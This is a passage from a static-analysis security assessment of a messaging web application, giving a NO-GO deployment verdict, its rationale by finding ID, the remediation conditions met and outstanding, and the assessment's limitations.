| Backups & recovery | **Fail** | No backup script, no snapshot policy, no restore procedure | Automated off-host backup **plus a rehearsed restore** (B5 — deferred) |
| Testing & maintainability | **Pass (repository)** | 73 `it` blocks / 79 test cases (authorization/registration/upload) across 8 files; e2e rewritten off the template | CI gate (B6 — not in scope) |
| Deployment & rollback | **Partial** | Pinned `mongo:7` / `node:22-alpine`, `npm ci` builds, multi-stage image | CI/CD and a documented rollback path (B6 — not in scope) |

### Verdict: **NO-GO** *(as of 2026-10-29, commit `1b33cc7`)*

> **Updated status (2026-10-30).** The repository-level Stage A fixes are complete and the
> authorization suite is green, so the two categorical blockers above (no authorization model,
> vulnerable framework) are resolved **in source**. The verdict is **not yet upgraded to
> CONDITIONAL GO**: three conditions remain and all require the target VPS — the live
> verification checklist, an off-host backup **with a rehearsed restore**, and a rotated
> `PAYLOAD_SECRET`. See the remediation status banner at the top of this document.

**Do not expose this application to the public internet** until the Stage A blockers are resolved.

**Rationale.** The application has no confidentiality boundary for either of its two messaging systems. SEC-002 and SEC-003 together mean every message in the deployment is readable by any logged-in user (and channel messages by anyone at all), while SEC-001 allows any account to take over any other account, and SEC-005 allows any account to post as any other account. These are not edge cases or hardening gaps — they are the absence of the property the application exists to provide. Compounding this, the framework layer carries two unauthenticated remote-code-execution advisories (SEC-006) and one in Payload (SEC-007) that are reachable on a standard deployment, and the repository's own deployment artefacts publish an unauthenticated MongoDB to the internet (SEC-012).

**Scope of this verdict.** This is a **static-analysis verdict** against the repository at commit `1b33cc7`. It does not assess the target VPS (firewall, TLS, MongoDB authentication, backups, OS patches) — all **Not verified**. It does not rely on any exploit having been executed; no exploit was executed. It is not a guarantee that the remaining, unverified areas are free of issues.

**Conditions for a future CONDITIONAL GO.** All of the following must be true:
1. SEC-001 through SEC-014 are closed and the regression tests in the remediation plan pass. — **Met (repository)**; tests green.
2. The authorization test suite runs green against a disposable database with synthetic accounts. — **Met** (73 `it` blocks / 79 test cases, 8 files, 2026-10-30).
3. `next` ≥ 15.5.28 and `payload` = 3.92.1 are installed, and the OSV scan for both returns zero records. — **Met** (Next 16.4.3, Payload 3.92.1, OSV clean).
4. The VPS is verified to have: TLS with a valid certificate, HTTP→HTTPS redirect, MongoDB bound to loopback with authentication, a firewall that exposes only 22/80/443, no published 27017, and no publicly reachable `.env`. — **Outstanding** (requires the target VPS).
5. A backup has been taken **and a restore has been rehearsed**. — **Outstanding** (task B5).

Once conditions 4 and 5 are verified on the VPS, the verdict can be upgraded to **CONDITIONAL GO** with SEC-015/017/018 residuals and the Stage B/C items tracked to completion.

**Fallback if Stage A cannot be completed.** The acceptable interim posture is to serve the application only behind an **authentication gate at the edge** — for example an identity-aware proxy, an OAuth2/OIDC layer, or HTTP Basic Auth in front of the entire site — while the authorisation work is completed. This does not replace the fixes, but it prevents anonymous internet access to a system whose authorization model is known to be absent. It must not be treated as a substitute for Stage A.

**Limitations of this assessment.** A static-analysis verdict cannot detect logic errors that require the application to run, nor configuration on the target host. A clean automated scan is not proof of security. The findings above were confirmed by reading the exact framework source at the pinned versions, which is a stronger form of evidence than package-age heuristics, but it remains short of execution.